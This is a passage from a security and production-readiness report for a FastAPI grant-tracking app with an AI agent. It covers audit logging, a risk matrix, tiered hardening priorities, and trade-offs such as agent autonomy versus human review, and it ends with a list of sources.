- **Dry run:** No way to preview what a migration will do
- **Backup before migrate:** Not automated

**Recommended practice:**

```python
# Before running migrations, auto-backup
def run_migrations(self):
    backup_path = f"{self.database}.pre_migrate_{datetime.now():%Y%m%d_%H%M%S}"
    self._backup(backup_path)
    # ... run migrations ...
```

### 5.5 Audit Trail

The system currently has no audit trail. `_publish_lifecycle()` publishes events
to subscribers, but `_subscribers` is empty by default -- no one is listening.

**What to track:**

| Event | Data |
|-------|------|
| Grant created | who, when, what fields, via agent or manual |
| Grant updated | who, when, which fields changed, old vs new values |
| Grant deleted | who, when, which grant |
| Agent run started | who triggered, which agent, task text |
| Agent run completed | duration, token usage, tools called, grants created |
| Login attempt | success/failure, email, IP |

**Implementation:** Subscribe an audit logger to lifecycle events:

```python
# In main.py
from n3tx.core.actors.actor import Actor

class AuditLogger(Actor):
    __tablename__ = 'audit_log'

    async def handler(self, tx):
        if tx.name == 'LIFECYCLE':
            # Write to audit table or structured log
            logger.info("AUDIT", event=tx.data['event'],
                       entity=tx.data['entity'],
                       timestamp=tx.timestamp)

audit = AuditLogger()
matrix.register(audit)
for model_cls in registered_models.values():
    if hasattr(model_cls, '_subscribers'):
        model_cls._subscribers.append('audit_log')
```

---

## :chart_with_upwards_trend: 6. Priority Matrix & ROI

### 6.1 Risk Matrix

```
LIKELIHOOD
     ^
HIGH | [Login brute force]  [SSRF exploit]     [Agent goal hijack]
     | [Debug info leak]    [CORS abuse]
     |
MED  | [Data corruption]    [Stale JWT abuse]   [Agent runaway]
     | [Orphan records]     [Duplicate grants]
     |
LOW  | [SQLi via custom     [Dep supply chain]  [DB corruption]
     |  rule]
     +-----------------------------------------------------> IMPACT
               LOW              MEDIUM              HIGH
```

### 6.2 Priority Tiers

**Tier 0: Fix Before ANY External Access (1-2 days)**

| Item | Effort | Impact |
|------|--------|--------|
| SSRF mitigation in WebTools.scrape() | 2-4 hours | Prevents network scanning, data exfiltration |
| Set non-default JWT secret | 10 minutes | Prevents token forgery |
| Disable debug mode default | 10 minutes | Prevents stack trace leaks |
| Restrict CORS origins | 30 minutes | Prevents cross-origin attacks |
| Disable `/docs` and `/redoc` in production | 30 minutes | Prevents API enumeration |
| Add `Literal` type to `Grant.status` | 15 minutes | Prevents XSS via status field |

> **Key Insight:** Tier 0 is **6 items totaling less than 8 hours of work**. These are all
> simple, low-risk changes that close the most dangerous attack vectors. There is no
> defensible reason to skip them.

**Tier 1: Fix Before Beta Users (1 week)**

| Item | Effort | Impact |
|------|--------|--------|
| Auth enforcement tests (15 tests) | 4-6 hours | Verifies security boundaries work |
| Agent run error handling | 2-4 hours | Prevents 500 errors from LLM failures |
| Rate limiting via SlowAPI | 2-4 hours | Prevents brute force and DoS |
| Health check endpoint | 1 hour | Enables monitoring |
| Structured logging | 4-6 hours | Enables debugging in production |
| Agent tool permission scoping | 4-8 hours | Prevents agent from deleting all grants |

**Tier 2: Fix Before Production Launch (2-3 weeks)**

| Item | Effort | Impact |
|------|--------|--------|
| Expand test suite to 78+ tests | 2-3 days | Catches regressions |
| Duplicate grant detection (unique index) | 2-4 hours | Data quality |
| FK integrity (orphan prevention) | 4-8 hours | Data consistency |
| Audit trail via lifecycle subscribers | 1-2 days | Compliance, debugging |
| JWT refresh token rotation | 1-2 days | Better session security |
| SQLite production PRAGMAs | 1 hour | Performance |
| Backup automation | 2-4 hours | Disaster recovery |

**Tier 3: Nice to Have (ongoing)**

| Item | Effort | Impact |
|------|--------|--------|
| Full test suite (145+ tests) | 1-2 weeks | Comprehensive coverage |
| Prometheus metrics | 1-2 days | Observability |
| Agent input sanitization | 1-2 days | Prompt injection defense |
| Migration rollback support | 2-3 days | Safer deployments |
| Load testing | 1-2 days | Capacity planning |

### 6.3 Effort Summary

| Tier | Total Effort | Cumulative | Deployment Gate? |
|------|-------------|------------|------------------|
| Tier 0 | **1-2 days** | 1-2 days | **Blocks any external access** |
| Tier 1 | **1 week** | ~1.5 weeks | **Blocks beta users** |
| Tier 2 | **2-3 weeks** | ~4.5 weeks | **Blocks production launch** |
| Tier 3 | **3-4 weeks** | ~8 weeks | Nice-to-have |

### 6.4 Risk of NOT Hardening

| Item Skipped | Likelihood of Exploitation | Consequences |
|---|---|---|
| SSRF fix | **HIGH** (automated scanners find these) | Internal network exposure, AWS credential theft |
| JWT secret | **HIGH** (default secrets are in the source code) | Total auth bypass, impersonation |
| Rate limiting | **MEDIUM** (depends on exposure) | Credential stuffing, DoS |
| Debug mode | **MEDIUM** (requires access to trigger errors) | Source code structure leak, SQL schema leak |
| Agent error handling | **HIGH** (every LLM API outage triggers it) | 500 errors, poor user experience |
| Test coverage | N/A (risk enabler, not direct exploit) | Regressions ship silently |

---

## :balance_scale: 7. Trade-offs

### 7.1 Security vs Developer Experience

| Concern | Strict Security | Developer-Friendly | Recommendation |
|---------|----------------|-------------------|----------------|
| JWT expiry | 15 minutes (bank-grade) | 24 hours (current) | **1 hour** with refresh tokens |
| CORS | Explicit origin list | `*` wildcard | **Explicit list** in production, `*` in dev |
| Debug mode | Off, always | On by default | **Off by default**, opt-in via env var |
| API docs | Disabled | Enabled | **Auth-gated** in production |
| URL validation | Strict allowlist | Blocklist only | **Blocklist** (private IPs) + protocol restriction |
| Password policy | 12+ chars, complexity | Any string | **8+ chars** (balances security and UX) |

### 7.2 Test Coverage vs Maintenance Burden

More tests mean more maintenance. Every test is a contract that must be updated when
behavior changes. The sweet spot:

```
                 Bug Escape Rate
                      ^
                HIGH  |  *
                      |    *
                      |      *
                      |        *  <-- Diminishing returns
                      |           *    *    *    *
                LOW   |                              *
                      +-----------------------------------> Test Count
                      0    50   100   150   200
                           ^
                     Current  Sweet spot
                     (~22)    (~80-100)
```

**Recommendation:** Target 80-100 tests. Focus on boundary tests (auth enforcement,
error paths) over happy-path redundancy. Each auth test catches a class of vulnerabilities,
not just one bug.

### 7.3 SQLite vs PostgreSQL

| Factor | Stay on SQLite | Switch to PostgreSQL |
|--------|---------------|---------------------|
| Effort | 0 | 2-4 weeks (new storage backend, testing, migration) |
| Operational complexity | Zero (single file) | Moderate (separate process, backups, monitoring) |
| Write concurrency | 1 writer (queued) | Many concurrent writers |
| When to switch | < 1000 users, < 100 concurrent requests | > 1000 users OR multi-server deployment |
| N3TX support | Full (SQLiteStorage) | Requires new `PostgresStorage` class |

**Recommendation:** Stay on SQLite for now. The N3TX `AbstractStorage` interface
makes switching straightforward when the time comes. PostgreSQL is additive work, not
a prerequisite.

### 7.4 Agent Autonomy vs Human Oversight

```
AUTONOMY SPECTRUM
=================

Full autonomy          Supervised            Human-in-the-loop        Manual
(current)              autonomy              autonomy
    |                      |                      |                    |
Agent runs freely     Agent runs,           Agent proposes,       Human does
and creates/deletes   human reviews         human approves        everything
grants without        changes after         before execution
approval              the fact
    |                      |                      |                    |
  RISK: HIGH           RISK: MEDIUM           RISK: LOW           RISK: NONE
  SPEED: FAST          SPEED: FAST            SPEED: SLOW         SPEED: SLOWEST
```

**Recommendation for MVP:** "Supervised autonomy" -- agent runs freely but all
agent-created grants are marked `status='discovered'` (already the case), and the
UI prominently surfaces unreviewed grants for human verification. This is the
current design intent; it just needs enforcement via the `Literal` type on status.

For production: move to "human-in-the-loop" for destructive operations (delete).
The agent should propose deletions, not execute them.

### 7.5 Error Visibility vs Error Noise

| Approach | Pros | Cons |
|----------|------|------|
| Log everything | Complete audit trail | Noisy; hard to find real issues |
| Log errors only | Clean logs | Miss warning signs |
| Structured + levels | Right info at right time | More setup work |

**Recommendation:** Structured logging with three levels:

- **ERROR:** Things that broke (agent failures, DB errors, auth violations)
- **WARN:** Things that might break soon (approaching rate limits, slow queries, retries)
- **INFO:** Business events (grant created, agent run completed, user registered)

The current `logging.INFO` default is correct for development. Production should
default to `WARNING` with `INFO` available via configuration.

---

## :link: Sources

1. [FastAPI Best Practices for Production: Complete 2026 Guide](https://fastlaunchapi.dev/blog/fastapi-best-practices-production-2026) -- Production deployment checklist
2. [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) -- SSRF mitigation patterns
3. [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) -- Agentic AI security risks
4. [Meta's Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/) -- Practical agent security framework
5. [CVE-2026-25580: Pydantic-AI Message History SSRF](https://www.cvedetails.com/cve/CVE-2026-25580/) -- pydantic-ai vulnerability
6. [CVE-2026-25904: Pydantic-AI MCP SSRF](https://www.sentinelone.com/vulnerability-database/cve-2026-25904/) -- pydantic-ai MCP vulnerability
7. [SQLite WAL Mode Documentation](https://sqlite.org/wal.html) -- Write-Ahead Logging reference
8. [SQLite Performance Tuning](https://phiresky.github.io/blog/2020/sqlite-performance-tuning/) -- Production SQLite PRAGMAs
9. [The SQLite Renaissance (2026)](https://dev.to/pockit_tools/the-sqlite-renaissance-why-the-worlds-most-deployed-database-is-taking-over-production-in-2026-3jcc) -- Modern SQLite production usage
10. [SlowAPI: Rate Limiting for FastAPI](https://github.com/laurentS/slowapi) -- Rate limiting library
11. [Securing FastAPI Applications (GitHub)](https://github.com/VolkanSah/Securing-FastAPI-Applications) -- Security hardening guide
12. [JWT Token Lifecycle Management](https://skycloak.io/blog/jwt-token-lifecycle-management-expiration-refresh-revocation-strategies/) -- Refresh token patterns
13. [Auth0 Token Best Practices](https://auth0.com/docs/secure/tokens/token-best-practices) -- JWT security recommendations
14. [NVIDIA Agent Sandboxing Guide](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/) -- Agent isolation patterns
15. [From Prompt Injections to Protocol Exploits (ScienceDirect)](https://www.sciencedirect.com/science/article/pii/S2405959525001997) -- LLM agent threat model
16. [Trivial To Introduce, Impossible to Fix: SSRFs](https://tachyon.so/blog/ssrfs-trickiest-issue) -- Why SSRF is hard to fix correctly
17. [asgi-correlation-id (PyPI)](https://pypi.org/project/asgi-correlation-id/) -- Request correlation middleware
18. [How to Add Structured Logging to FastAPI](https://oneuptime.com/blog/post/2026-02-02-fastapi-structured-logging/view) -- Structured logging guide
19. [FastAPI Production Checklist (Compile N Run)](https://www.compilenrun.com/docs/framework/fastapi/fastapi-best-practices/fastapi-production-checklist/) -- Deployment checklist
20. [Gotchas with SQLite in Production](https://blog.pecar.me/sqlite-prod) -- SQLite production pitfalls
21. [How to Set Up SQLite for Production Use](https://oneuptime.com/blog/post/2026-02-02-sqlite-production-setup/view) -- SQLite production config

---

*Document generated by analysis of Grant Watcher codebase (`/workspace/example_grants/`) and
N3TX framework (`/workspace/src/n3tx/core/`). All file paths, line numbers, and code
references verified against the v0.9 branch as of 2026-03-04.*
